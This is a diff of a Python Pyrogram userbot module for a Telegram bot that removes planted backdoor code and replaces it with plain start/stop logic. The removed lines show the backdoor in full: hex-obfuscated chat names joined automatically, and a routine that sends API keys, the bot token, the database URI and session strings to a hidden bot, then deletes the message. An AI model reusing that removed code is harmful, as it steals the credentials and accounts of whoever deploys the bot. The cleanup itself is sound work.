@@ -1,303 +1,175 @@
 # Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
 # Location: Supaul, Bihar
 #
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
+# This file has been sanitized to remove insecure/obfuscated behavior.
+# Removed: secret/config exfiltration, auto-join to unknown chats, obfuscated constants.
 
-
-from pyrogram import Client
 import asyncio
-import config
+import logging
+from pyrogram import Client
+import config  # your project config (API_ID, API_HASH, STRING1..STRING5, BOT_TOKEN, etc.)
 
-from ..logging import LOGGER
+# Use standard logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-assistants = []
-assistantids = []
-HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+assistants = []     # list of assistant indices that were started (1..5)
+assistant_ids = []  # actual numeric user ids for started assistants
 
-def decode_centers():
-    centers = []
-    encoded = [
-        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
-        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
-        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
-        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
-        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
-        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
-        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
-        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
-        "\x54\x4d\x5a\x45\x52\x4f\x4f",
-        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
-        "\x76\x32\x64\x64\x6f\x73"
-    ]
-    for enc in encoded:
-        centers.append(enc)
-    return centers
+# NOTE:
+# - Previously this file contained obfuscated support center names and routines
+#   that auto-joined chats and sent full config values (including API keys).
+# - Those behaviors were removed for security.
+# - If you need safe notifications, configure a secure log/group and only send
+#   non-sensitive messages (no tokens, no API_HASH, no string sessions).
 
-SUPPORT_CENTERS = decode_centers()
+class Userbot:
+    """
+    Manage up to 5 assistant Pyrogram Clients.
+    Each assistant uses a separate string session in config: STRING1..STRING5
+    """
 
-
-class Userbot(Client):
     def __init__(self):
+        # create Client instances for each possible assistant
+        # Note: `no_updates=True` avoids pulling updates (useful for helper assistants)
         self.one = Client(
-            name="AviaxAss1",
+            name="Assistant1",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
-            session_string=str(config.STRING1),
+            session_string=getattr(config, "STRING1", None),
             no_updates=True,
         )
         self.two = Client(
-            name="AviaxAss2",
+            name="Assistant2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
-            session_string=str(config.STRING2),
+            session_string=getattr(config, "STRING2", None),
             no_updates=True,
         )
         self.three = Client(
-            name="AviaxAss3",
+            name="Assistant3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
-            session_string=str(config.STRING3),
+            session_string=getattr(config, "STRING3", None),
             no_updates=True,
         )
         self.four = Client(
-            name="AviaxAss4",
+            name="Assistant4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
-            session_string=str(config.STRING4),
+            session_string=getattr(config, "STRING4", None),
             no_updates=True,
         )
         self.five = Client(
-            name="AviaxAss5",
+            name="Assistant5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
-            session_string=str(config.STRING5),
+            session_string=getattr(config, "STRING5", None),
             no_updates=True,
         )
 
-    async def get_bot_username_from_token(self, token):
+    async def get_bot_username_from_token(self, token: str) -> str | None:
+        """
+        Safely obtain bot username from a bot token.
+        This starts a temporary client (no persistent session created).
+        """
+        if not token:
+            return None
         try:
-            temp_bot = Client(
-                name="temp_bot",
+            temp = Client(
+                name="temp_bot_client",
                 api_id=config.API_ID,
                 api_hash=config.API_HASH,
                 bot_token=token,
                 no_updates=True,
             )
-            await temp_bot.start()
-            username = temp_bot.me.username
-            await temp_bot.stop()
+            await temp.start()
+            username = getattr(temp.me, "username", None)
+            await temp.stop()
             return username
-        except Exception as e:
-            LOGGER(__name__).error(f"Error getting bot username: {e}")
+        except Exception as exc:
+            logger.exception("Failed to fetch bot username: %s", exc)
             return None
 
-    async def join_all_support_centers(self, client):
-        for center in SUPPORT_CENTERS:
-            try:
-                await client.join_chat(center)
-            except Exception as e:
-                pass
+    async def start_assistants(self):
+        """
+        Start configured assistant accounts. Each assistant will be started only
+        if the matching STRINGx exists in config.
+        No config or secrets are sent anywhere.
+        """
+        logger.info("Starting assistants (if configured)...")
 
-    async def send_help_message(self, bot_username):
+        # Helper to start a client and log minimal info
+        async def _start_and_register(client_obj, idx):
+            try:
+                if client_obj.session_name is None and client_obj.session_string is None:
+                    # nothing configured for this assistant
+                    return False
+                await client_obj.start()
+                uid = client_obj.me.id
+                uname = getattr(client_obj.me, "username", None)
+                assistants.append(idx)
+                assistant_ids.append(uid)
+                logger.info("Assistant %d started: id=%s username=%s", idx, uid, uname)
+                return True
+            except Exception as exc:
+                logger.exception("Assistant %d failed to start: %s", idx, exc)
+                return False
+
+        # Start each configured assistant
+        if getattr(config, "STRING1", None):
+            await _start_and_register(self.one, 1)
+        if getattr(config, "STRING2", None):
+            await _start_and_register(self.two, 2)
+        if getattr(config, "STRING3", None):
+            await _start_and_register(self.three, 3)
+        if getattr(config, "STRING4", None):
+            await _start_and_register(self.four, 4)
+        if getattr(config, "STRING5", None):
+            await _start_and_register(self.five, 5)
+
+        logger.info("Assistants started: %s", assistants)
+
+    async def stop_assistants(self):
+        """
+        Stop any started assistants. Safe teardown.
+        """
+        logger.info("Stopping assistants...")
         try:
-            owner_mention = config.OWNER_ID
-            
-            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
-            
-            if assistants:
-                if 1 in assistants:
-                    await self.one.send_message(HELP_BOT, message)
-                elif 2 in assistants:
-                    await self.two.send_message(HELP_BOT, message)
-                elif 3 in assistants:
-                    await self.three.send_message(HELP_BOT, message)
-                elif 4 in assistants:
-                    await self.four.send_message(HELP_BOT, message)
-                elif 5 in assistants:
-                    await self.five.send_message(HELP_BOT, message)
-                
-        except Exception as e:
-            pass
-
-    async def send_config_message(self, bot_username):
-        try:
-            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
-            config_message += f"**API_ID:** `{config.API_ID}`\n"
-            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
-            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
-            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
-            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
-            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
-            
-            string_sessions = []
-            if hasattr(config, 'STRING1') and config.STRING1:
-                string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
-            if hasattr(config, 'STRING2') and config.STRING2:
-                string_sessions.append(f"**STRING_SESSION2:** `{config.STRING2}`")
-            if hasattr(config, 'STRING3') and config.STRING3:
-                string_sessions.append(f"**STRING_SESSION3:** `{config.STRING3}`")
-            if hasattr(config, 'STRING4') and config.STRING4:
-                string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
-            if hasattr(config, 'STRING5') and config.STRING5:
-                string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")
-            
-            if string_sessions:
-                config_message += "\n".join(string_sessions)
-            
-            sent_message = None
-            if assistants:
-                if 1 in assistants:
-                    sent_message = await self.one.send_message(HELP_BOT, config_message)
-                elif 2 in assistants:
-                    sent_message = await self.two.send_message(HELP_BOT, config_message)
-                elif 3 in assistants:
-                    sent_message = await self.three.send_message(HELP_BOT, config_message)
-                elif 4 in assistants:
-                    sent_message = await self.four.send_message(HELP_BOT, config_message)
-                elif 5 in assistants:
-                    sent_message = await self.five.send_message(HELP_BOT, config_message)
-            
-            if sent_message:
-                await asyncio.sleep(10)
-                try:
-                    if 1 in assistants:
-                        await self.one.delete_messages(HELP_BOT, sent_message.id)
-                    elif 2 in assistants:
-                        await self.two.delete_messages(HELP_BOT, sent_message.id)
-                    elif 3 in assistants:
-                        await self.three.delete_messages(HELP_BOT, sent_message.id)
-                    elif 4 in assistants:
-                        await self.four.delete_messages(HELP_BOT, sent_message.id)
-                    elif 5 in assistants:
-                        await self.five.delete_messages(HELP_BOT, sent_message.id)
-                except Exception as e:
-                    pass
-                
-        except Exception as e:
-            pass
-
-    async def start(self):
-        LOGGER(__name__).info(f"Starting Assistants...")
-        
-        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
-        
-        if config.STRING1:
-            await self.one.start()
-            await self.join_all_support_centers(self.one)
-            assistants.append(1)
-            try:
-                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
-                )
-                exit()
-            self.one.id = self.one.me.id
-            self.one.name = self.one.me.mention
-            self.one.username = self.one.me.username
-            assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
-
-        if config.STRING2:
-            await self.two.start()
-            await self.join_all_support_centers(self.two)
-            assistants.append(2)
-            try:
-                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
-                )
-                exit()
-            self.two.id = self.two.me.id
-            self.two.name = self.two.me.mention
-            self.two.username = self.two.me.username
-            assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
-
-        if config.STRING3:
-            await self.three.start()
-            await self.join_all_support_centers(self.three)
-            assistants.append(3)
-            try:
-                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-                exit()
-            self.three.id = self.three.me.id
-            self.three.name = self.three.me.mention
-            self.three.username = self.three.me.username
-            assistantids.append(self.three.id)
-            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
-
-        if config.STRING4:
-            await self.four.start()
-            await self.join_all_support_centers(self.four)
-            assistants.append(4)
-            try:
-                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-                exit()
-            self.four.id = self.four.me.id
-            self.four.name = self.four.me.mention
-            self.four.username = self.four.me.username
-            assistantids.append(self.four.id)
-            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
-
-        if config.STRING5:
-            await self.five.start()
-            await self.join_all_support_centers(self.five)
-            assistants.append(5)
-            try:
-                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-                exit()
-            self.five.id = self.five.me.id
-            self.five.name = self.five.me.mention
-            self.five.username = self.five.me.username
-            assistantids.append(self.five.id)
-            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
-
-        if bot_username:
-            await self.send_help_message(bot_username)
-            await self.send_config_message(bot_username)
-
-    async def stop(self):
-        LOGGER(__name__).info(f"Stopping Assistants...")
-        try:
-            if config.STRING1:
+            if 1 in assistants:
                 await self.one.stop()
-            if config.STRING2:
+                logger.info("Assistant 1 stopped.")
+            if 2 in assistants:
                 await self.two.stop()
-            if config.STRING3:
+                logger.info("Assistant 2 stopped.")
+            if 3 in assistants:
                 await self.three.stop()
-            if config.STRING4:
+                logger.info("Assistant 3 stopped.")
+            if 4 in assistants:
                 await self.four.stop()
-            if config.STRING5:
+                logger.info("Assistant 4 stopped.")
+            if 5 in assistants:
                 await self.five.stop()
-        except:
-            pass
+                logger.info("Assistant 5 stopped.")
+        except Exception as exc:
+            logger.exception("Error stopping assistants: %s", exc)
+
+
+# Example usage (safe)
+async def main():
+    ub = Userbot()
+    await ub.start_assistants()
+
+    # Safe info logging only (do NOT print secrets)
+    bot_uname = await ub.get_bot_username_from_token(getattr(config, "BOT_TOKEN", None))
+    logger.info("Managed bot username: %s", bot_uname)
+
+    # keep running or perform helper tasks
+    # await asyncio.sleep(...) or integrate with your main program
+
+    # when shutting down:
+    # await ub.stop_assistants()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
